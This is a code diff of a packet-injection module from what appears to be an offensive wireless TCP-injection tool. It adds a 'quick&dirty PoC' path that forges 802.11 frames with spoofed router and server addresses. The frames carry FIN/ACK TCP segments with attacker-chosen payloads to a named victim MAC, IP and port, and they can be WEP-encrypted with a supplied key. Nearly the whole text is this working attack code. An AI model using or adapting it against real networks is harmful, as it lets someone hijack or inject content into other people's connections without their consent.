@@ -1,6 +1,7 @@
 from lib.headers import Headers
 from lib.visuals import Bcolors
-from scapy.all import *
+from pyDot11 import *
+#from scapy.all import *
 import fcntl, socket, struct, sys, time
 
 global npackets
@@ -29,9 +30,10 @@ class Injector(object):
         return hex(struct.unpack('<I', struct.pack('<f', f))[0])
 
 
-    ### Should be able to dict this?
     def inject(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, args, procTimerStart, procTimerEnd):
-        """Inject function performs the actual injection using scapy."""
+        """Inject function
+        Sends the injection using Scapy
+        """
         injectTimerStart = time.time()
         global npackets
         npackets += 1
@@ -40,11 +42,79 @@ class Injector(object):
         if ("mon" in self.interface):
             hdr = Headers()
             headers = hdr.default(injection)
-            ### We should use the \ format here to make this a lot more readable
-            if (TSVal is not None and TSecr is not None):
-                packet = RadioTap()/Dot11(FCfield = 'from-DS', addr1 = vicmac, addr2 = rtrmac, addr3 = rtrmac)/LLC()/SNAP()/IP(dst = vicip, src = svrip)/TCP(flags = "FA", sport = int(svrport), dport = int(vicport), seq = int(seqnum), ack = int(acknum), options = [('NOP', None), ('NOP', None), ('Timestamp', ((round(time.time()), TSVal)))])/Raw(load = headers + injection)
+
+            ### Nasty quick&dirty PoC for pyDot11
+            ### This if should be verified against open, and then combined when ==
+            if args.p:
+                packet = RadioTap()\
+                        /Dot11(
+                              FCfield = 'from-DS',
+                              addr1 = vicmac,
+                              addr2 = rtrmac,
+                              addr3 = rtrmac,
+                              subtype = 8L,
+                              type = 2
+                              )\
+                        /Dot11QoS()\
+                        /LLC()\
+                        /SNAP()\
+                        /IP(
+                           dst = vicip,
+                           src = svrip
+                           )\
+                        /TCP(
+                            flags = 'FA',
+                            sport = int(svrport),
+                            dport = int(vicport),
+                            seq = int(seqnum),
+                            ack = int(acknum)
+                            )\
+                        /Raw(
+                            load = headers + injection
+                            )\
+
             else:
-                packet = RadioTap()/Dot11(FCfield = 'from-DS', addr1 = vicmac, addr2 = rtrmac, addr3 = rtrmac)/LLC()/SNAP()/IP(dst = vicip, src = svrip)/TCP(flags = "FA", sport = int(svrport), dport = int(vicport), seq = int(seqnum), ack = int(acknum), options = [('NOP', None), ('NOP', None), ('Timestamp', ((round(time.time()), 0)))])/Raw(load = headers + injection)
+                packet = RadioTap()\
+                        /Dot11(
+                              FCfield = 'from-DS',
+                              addr1 = vicmac,
+                              addr2 = rtrmac,
+                              addr3 = rtrmac
+                              )\
+                        /LLC()\
+                        /SNAP()\
+                        /IP(
+                            dst = vicip,
+                            src = svrip
+                           )\
+                        /TCP(
+                            flags = 'FA',
+                            sport = int(svrport),
+                            dport = int(vicport),
+                            seq = int(seqnum),
+                            ack = int(acknum)
+                            )\
+                        /Raw(
+                            load = headers + injection
+                            )\
+                    
+            if TSVal is not None and TSecr is not None:
+                packet[TCP].options = [
+                                        ('NOP', None),
+                                        ('NOP', None),
+                                        ('Timestamp',
+                                        ((round(time.time()), TSVal)))
+                                        ]
+            else:
+                packet[TCP].options = [
+                                        ('NOP', None),
+                                        ('NOP', None),
+                                        ('Timestamp',
+                                        ((round(time.time()), 0)))
+                                        ]
+
+            if args.p:
+                packet = wepEncrypt(packet, args.w)
 
             try:
                 sendp(packet, iface = self.interface, verbose = 0)
@@ -62,22 +132,97 @@ class Injector(object):
             ### Single packet exit point
             ### Have to work on how to exit cleanly, instantiation is preventing?...
             if args.single:
-                #sys.stdout.write(Bcolors.OKBLUE + "[*] Injecting Packet to victim " + vicmac + " (TOTAL: " + str(npackets) + " injected packets)\r\n" + Bcolors.ENDC)
                 sys.stdout.write(Bcolors.OKBLUE + "[*] Injecting Packet to victim " + Bcolors.WARNING + vicmac + Bcolors.OKBLUE + " (TOTAL: " + str(npackets) + " injected packets)\r" + Bcolors.ENDC)
                 sys.exit(0)
-
         else:
             hdr = Headers()
             headers = hdr.default(injection)
-            if (TSVal is not None):
-                ### We should use the \ format here to make this a lot more readable
-                packet = Ether(src = self.getHwAddr(self.interface), dst = vicmac)/IP(dst = vicip, src = svrip)/TCP(flags = "FA", sport = int(svrport), dport = int(vicport), seq = int(seqnum), ack = int(acknum), options = [('NOP', None), ('NOP', None), ('Timestamp', ((round(time.time()), TSVal)))])/Raw(load = headers + injection)
+            
+            ### Nasty quick&dirty PoC for pyDot11
+            if args.p:
+                packet = RadioTap()\
+                        /Dot11(
+                                FCfield = 'from-DS',
+                                addr1 = vicmac,
+                                addr2 = rtrmac,
+                                addr3 = rtrmac
+                                )\
+                        /LLC()\
+                        /SNAP()\
+                        /IP(
+                            dst = vicip,
+                            src = svrip
+                            )\
+                        /TCP(
+                            flags = "FA",
+                            sport = int(svrport),
+                            dport = int(vicport),
+                            seq = int(seqnum),
+                            ack = int(acknum)
+                            )\
+                        /Raw(
+                            load = headers + injection
+                            )\
+                        
+                if TSVal is not None:
+                    packet[TCP].options = [
+                                            ('NOP', None),
+                                            ('NOP', None),
+                                            ('Timestamp',
+                                            ((round(time.time()), TSVal)))
+                                            ]
+                else:
+                    packet[TCP].options = [
+                                            ('NOP', None),
+                                            ('NOP', None),
+                                            ('Timestamp',
+                                            ((round(time.time()), 0)))
+                                            ]
+
+                packet = wepEncrypt(packet, args.w)
+                        
+                
             else:
-                packet = Ether(src = self.getHwAddr(self.interface), dst = vicmac)/IP(dst = vicip, src = svrip)/TCP(flags = "FA", sport = int(svrport), dport = int(vicport), seq = int(seqnum), ack = int(acknum), options = [('NOP', None), ('NOP', None), ('Timestamp', ((round(time.time()), 0)))])/Raw(load = headers + injection)
+                packet = Ether(
+                              src = self.getHwAddr(self.interface),
+                              dst = vicmac
+                              )\
+                        /IP(
+                           dst = vicip,
+                           src = svrip
+                           )\
+                        /TCP(
+                            flags = 'FA',
+                            sport = int(svrport),
+                            dport = int(vicport),
+                            seq = int(seqnum),
+                            ack = int(acknum)
+                            )\
+                        /Raw(
+                            load = headers + injection
+                            )\
+
+                if TSVal is not None:
+                    packet[TCP].options = [
+                                          ('NOP', None),
+                                          ('NOP', None),
+                                          ('Timestamp',
+                                          ((round(time.time()), TSVal)))
+                                          ]
+                else:
+                    packet[TCP].options = [
+                                          ('NOP', None),
+                                          ('NOP', None),
+                                          ('Timestamp',
+                                          ((round(time.time()), 0)))
+                                          ]
 
             try:
-                print packet.show()
-                sendp(packet,iface = self.interface, verbose = 0)
+                ### pyDot11 hack
+                if args.p:
+                    sendp(packet, iface = 'wlan0mon', verbose = 0)
+                else:
+                    sendp(packet, iface = self.interface, verbose = 0)
                 injectTimerEnd = time.time()
                 if args.d:
                     print '\nProcess Began: %f' % procTimerStart
